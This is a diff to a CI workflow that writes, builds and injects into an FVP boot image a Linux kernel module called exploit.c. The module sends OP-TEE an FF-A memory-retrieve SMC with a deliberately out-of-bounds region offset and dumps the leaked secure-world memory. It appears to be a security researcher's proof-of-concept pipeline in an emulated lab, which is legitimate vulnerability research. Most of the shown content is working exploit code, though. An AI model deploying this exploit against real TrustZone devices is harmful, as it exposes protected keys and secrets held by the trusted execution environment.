@@ -62,7 +62,7 @@ jobs:
       - name: Create Exploit LKM Source
         run: |
           mkdir -p optee-lkm
-          cat > optee-lkm/exploit.c << 'INNER_EOF'
+          cat > optee-lkm/exploit.c << 'EOF'
 #include <linux/module.h>
 #include <linux/arm-smccc.h>
 #include <linux/io.h>
@@ -147,7 +147,7 @@ static int __init exploit_init(void) {
     mem_acc = (struct ffa_mem_access *)(tx_buf + trans->mem_access_offs);
     mem_acc->endpoint_id = 0x8001;
     mem_acc->perm = 0x2;
-    mem_acc->region_offs = 0x1000; // O OFFSET MALICIOSO
+    mem_acc->region_offs = 0x1000;
 
     pr_info("[oob_read] Enviando SMC com region_offs=0x1000 (OOB)...\n");
     arm_smccc_smc(FFA_MEM_RETRIEVE_REQ_SMC64, 128, 128, 0, 0, 0, 0, 0, &res);
@@ -156,10 +156,8 @@ static int __init exploit_init(void) {
     if (res.a0 != 0x84000060) {
         pr_info("[!!!] CRITICAL: OP-TEE aceitou o offset OOB!\n");
         uint32_t *leak = (uint32_t *)rx_buf;
-        pr_info("[!!!] Dump dos dados vazados:\n");
-        for (int i = 0; i < 16; i++) {
+        for (int i = 0; i < 16; i++)
             pr_info("[oob_read] +%03d: 0x%08x\n", i * 4, leak[i]);
-        }
     } else {
         pr_info("[oob_read] OP-TEE rejeitou o offset (Safe).\n");
     }
@@ -173,8 +171,7 @@ static void __exit exploit_exit(void) { }
 module_init(exploit_init);
 module_exit(exploit_exit);
 MODULE_LICENSE("GPL");
-INNER_EOF
-
+EOF
           printf 'obj-m += exploit.o\n' > optee-lkm/Makefile
           printf 'KDIR ?= $(CURDIR)/../optee-fvp/linux\n' >> optee-lkm/Makefile
           printf 'all:\n' >> optee-lkm/Makefile
@@ -188,6 +185,16 @@ INNER_EOF
       - name: Inject Exploit into Rootfs Image
         run: |
           mcopy -i optee-fvp/out/boot-fat.uefi.img optee-lkm/exploit.ko ::/
+
+      - name: List generated artifacts
+        if: always()
+        run: |
+          echo "=== BINs gerados ==="
+          find . -name "*.bin" | sort
+          echo "=== IMGs gerados ==="
+          find . -name "*.img" | sort
+          echo "=== KOs gerados ==="
+          find . -name "*.ko" | sort
 
       - name: Upload build artifacts
         if: always()
